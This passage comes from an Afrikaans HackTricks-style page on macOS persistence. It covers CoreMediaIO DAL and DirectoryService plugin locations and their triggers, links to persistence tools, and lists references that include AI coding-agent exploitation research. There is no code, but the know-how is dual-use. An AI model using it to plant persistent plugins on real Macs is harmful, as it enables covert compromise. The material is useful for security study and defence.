  - **Sneller:** ’n Versoenbare kamerakliënt lys toestelle **nadat verouderde steun herstel is**. Kliëntbiblioteekvalidering kan ’n derdeparty-inprop blokkeer.

#### Beskrywing en uitbuiting

CoreMediaIO **DAL** (Device Abstraction Layer)-inproppe is deur sommige kamera-toepassings binne die proses gelaai. Apple se [aanbieding oor kamera-uitbreidings](https://developer.apple.com/videos/play/wwdc2022/10022/) sê spesifiek dat verouderde DAL-inproppe **nie** met FaceTime, QuickTime Player of Photo Booth gewerk het nie, en dat baie ander kliënte biblioteekvalidering afdwing. Moderne [Core Media I/O-uitbreidings](https://developer.apple.com/documentation/coremediaio) loop buite die proses en gebruik ’n afsonderlike installasie- en goedkeuringsmodel. Die historiese binneproses-tegniek impliseer nie ’n algemene Camera TCC-omseiling op huidige macOS nie.<sup>[[53]](#references)[[54]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` bestaan en behoort aan root. Nóg verouderde steun nóg laaiing deur enige kliënt is geverifieer.

### Directory Service-inproppe

Beskrywing: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Verouderde, voorwaardelike meganisme:** Root is nodig om dit te installeer, en ’n inprop moet werklik opgestel en gelaai word. DirectoryService se inprop-API is afgekeur; raadpleeg die teiken-Mac se Open Directory-opstelling voordat jy dit as ’n selflaaisneller beskou.

#### Ligging

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root is nodig
  - **Sneller:** `dspluginhelperd` laai ’n geskikte, opgestelde inprop wanneer Open Directory dit nodig het. [Apple se gids vir die inprop-looptydomgewing](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) meld dat inproppe wat nie vir selflaai opgestel is nie, luiweg kan laai wanneer hul nodus oopgemaak word.

#### Beskrywing en uitbuiting

`dspluginhelperd` ondersteun verouderde DirectoryService-inpropbundels. ’n Kwaadwillige inprop kan ’n bevoorregte uitvoeringspad wees waar die verouderde inprop aanvaar en geaktiveer word; dit verskil van PAM- en Authorization-inproppe. Die gids se bestaan bewys nie dat ’n nuutgeskrewe inprop met die volgende selflaai sal loop nie. Apple se plaaslike `dspluginhelperd(8)`- en `opendirectoryd(8)`-handleidings op macOS 26.5 lys steeds die helper en hierdie verouderde pad.<sup>[[53]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/DirectoryServices/PlugIns` en `/usr/libexec/dspluginhelperd` bestaan. Geen inprop is tydens hierdie toets geïnstalleer, opgestel of gelaai nie.

## Volhardingstegnieke en nutsmiddels

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Verder as die goeie ou LaunchAgents - 1 - shell-opstartlêers](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Verder as die goeie ou LaunchAgents - 18 - X11 en XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Verder as die goeie ou LaunchAgents - 21 - Heropende toepassings](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Verder as die goeie ou LaunchAgents - 20 - Terminal-voorkeure](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Verder as die goeie ou LaunchAgents - 13 - Oudio-inproppe](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit-inproppe (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Verder as die goeie ou LaunchAgents - 12 - QuickLook-inproppe](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Verder as die goeie ou LaunchAgents - 22 - LoginHook en LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Verder as die goeie ou LaunchAgents - 4 - cron-take](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Verder as die goeie ou LaunchAgents - 2 - iTerm2-opstart](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Verder as die goeie ou LaunchAgents - 7 - xbar-inproppe](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Verder as die goeie ou LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Verder as die goeie ou LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Verder as die goeie ou LaunchAgents - 3 - Aanmelditems](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Verder as die goeie ou LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Verder as die goeie ou LaunchAgents - 24 - Gidsaksies](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Gidsaksies vir volharding op macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Verder as die goeie ou LaunchAgents - 27 - Dock-kortpaaie](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Verder as die goeie ou LaunchAgents - 17 - Kleurkiesers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Verder as die goeie ou LaunchAgents - 26 - Finder Sync-inproppe](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ontleding van "Mac File Opener"-volharding (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Verder as die goeie ou LaunchAgents - 16 - Skermbeskermer](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Behou jou toegang: skermbeskermers vir macOS-volharding (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Verder as die goeie ou LaunchAgents - 11 - Spotlight-invoerders](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Verder as die goeie ou LaunchAgents - 9 - Voorkeurpaneel](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Verder as die goeie ou LaunchAgents - 19 - Periodieke skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Verder as die goeie ou LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Verder as die goeie ou LaunchAgents - 28 - Authorization-inproppe](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Volgehoue geloofsbriewe-diefstal met Authorization-inproppe (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Verder as die goeie ou LaunchAgents - 30 - Die man-konfigurasielêer - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Verder as die goeie ou LaunchAgents - 25 - Apache2-modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Verder as die goeie ou LaunchAgents - 31 - BSM-ouditraamwerk](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Verder as die goeie ou LaunchAgents - 23 - emond, die gebeurtenismonitordaemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Verder as die goeie ou LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Verder as die goeie ou LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Verder as die goeie ou LaunchAgents - 10 - Toepassingskriplêers](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Verder as die goeie ou LaunchAgents - 32 - Dock-teëlinproppe](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Verder as die goeie ou LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Verder as die goeie ou LaunchAgents - 34 - launchd-selflaaitake](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Verder as die goeie ou LaunchAgents - 35 - Volharding deur die NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Gebruik e-pos vir volharding op OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdagte wysiging van Apple Mail-reël-Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Kwaadwillige profiele - Een van die ernstigste bedreigings vir Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Die kuns van Mac-wanware Vol.1 - Hoofstuk 0x2 Volharding (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Ontleding van CVE-2024-44243, ’n macOS SIP-omseiling deur kernuitbreidings (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE en API-token-eksfiltrasie deur Claude Code-projeklêers (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nuwe kwesbaarheid in GitHub Copilot en Cursor - Reëllêer-agterdeur (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternatiewe installasiemetodes (Eksterne uitbreidings)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Verwyder ExtensionInstallForcelist in Chrome op Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Oor die skryf van Sudo-inproppe (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Afgeleë Mac-uitbuiting via pasgemaakte URL-skemas (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Twee macOS-volhardingstruuks wat inproppe misbruik (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL-minimale voorbeeld (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Ontleding van ’n Spotlight-gebaseerde macOS TCC-kwesbaarheid (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site`-module-dokumentasie (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Van Spotlight tot Apple Intelligence — Misbruik van ’n 0day om die data te steel wat macOS KI aandryf](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 — Pakketopstartkonfigurasielêers](https://peps.python.org/pep-0829/)
- [59] [Python 3.15 `site`-dokumentasie — opstarttoegangspunte](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit — PEP 829 en `.start`-lêers](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
